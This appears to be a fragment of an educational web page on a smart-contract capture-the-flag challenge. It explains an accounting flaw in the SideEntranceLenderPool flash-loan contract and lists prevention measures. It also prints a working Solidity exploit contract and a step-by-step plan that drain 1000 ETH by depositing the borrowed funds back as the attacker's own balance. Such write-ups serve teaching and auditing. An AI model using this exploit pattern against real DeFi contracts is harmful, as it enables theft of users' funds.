            <h5>üéØ Goal:</h5>
            <p>Drain 1000 ETH from the vulnerable SideEntranceLenderPool contract.</p>

            <h5>üí• What's the vulnerability?</h5>
            <p>The pool has these features:</p>
            <ul>
              <li>Anyone can deposit and withdraw ETH.</li>
              <li>It also gives flash loans (borrow and repay in the same transaction).</li>
              <li>Flash loan gives ETH and then calls your contract's execute() function.</li>
            </ul>

            <Alert variant="danger" className="d-flex align-items-start">
              <AlertTriangle className="me-2 mt-1" />
              <div>
                <strong>Critical Vulnerability:</strong> The contract tracks deposits and flash loan repayments 
                using the same balance mapping, allowing a malicious actor to use the flash loaned amount 
                as their own deposit balance.
              </div>
            </Alert>

            <h5>üîç Detailed Analysis:</h5>
            <p>The vulnerability stems from how the pool tracks balances:</p>
            <ol>
              <li>The pool uses a simple <code>balances</code> mapping to track both deposits and flash loan repayments.</li>
              <li>When you repay a flash loan via deposit, it increases your <code>balances</code> entry.</li>
              <li>The flash loan repayment check only verifies that the contract's ETH balance increased, not how it increased.</li>
              <li>This creates an accounting inconsistency where the same ETH is counted both as repaid loan and as your deposit.</li>
            </ol>

            <h5>üöÄ Attack Plan:</h5>
            <ol>
              <li>Take a flash loan of 1000 ETH.</li>
              <li>In the execute() function, immediately deposit the 1000 ETH back.</li>
              <li>The pool thinks the flash loan was repaid ‚Äî ‚úÖ.</li>
              <li>But now your contract has a 1000 ETH internal balance in the pool.</li>
              <li>You call withdraw() to take out the full 1000 ETH.</li>
              <li>Finally, send the ETH to your wallet.</li>
            </ol>

            <h5>üõ°Ô∏è Prevention:</h5>
            <p>To prevent this attack, the contract should:</p>
            <ul>
              <li>Separate the tracking of deposits and flash loan repayments</li>
              <li>Use a dedicated variable to track outstanding flash loans</li>
              <li>Implement checks-effects-interactions pattern</li>
              <li>Consider using OpenZeppelin's ReentrancyGuard</li>
            </ul>

            <h5>Exploit Contract:</h5>
            <pre className="bg-light p-3 rounded mb-4">
{`contract Attacker {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    // Step 1: Start the attack
    function attack() external {
        pool.flashLoan(1000 ether); // borrow all ETH
        pool.withdraw(); // withdraw credited deposit
        payable(owner).transfer(address(this).balance); // send to attacker
    }

    // Step 2: Pool calls this after giving us the loan
    function execute() external payable {
        pool.deposit{value: msg.value}(); // deposit the ETH back
    }

    receive() external payable {}
}`}
            </pre>

            <h5>‚öôÔ∏è Attack Execution Flow:</h5>
            <ol>
              <li>Attacker calls <code>attack()</code></li>
              <li>Contract takes 1000 ETH flash loan</li>
              <li>Pool calls <code>execute()</code> with 1000 ETH</li>
              <li>Attacker deposits the 1000 ETH back, increasing their balance</li>
              <li>Flash loan is considered repaid</li>
              <li>Attacker withdraws their 1000 ETH balance</li>
              <li>ETH is transferred to attacker's wallet</li>
            </ol>

            <Alert variant="warning">
              This attack demonstrates how improper accounting separation between different contract 
              functionalities can lead to critical vulnerabilities, even without traditional reentrancy.
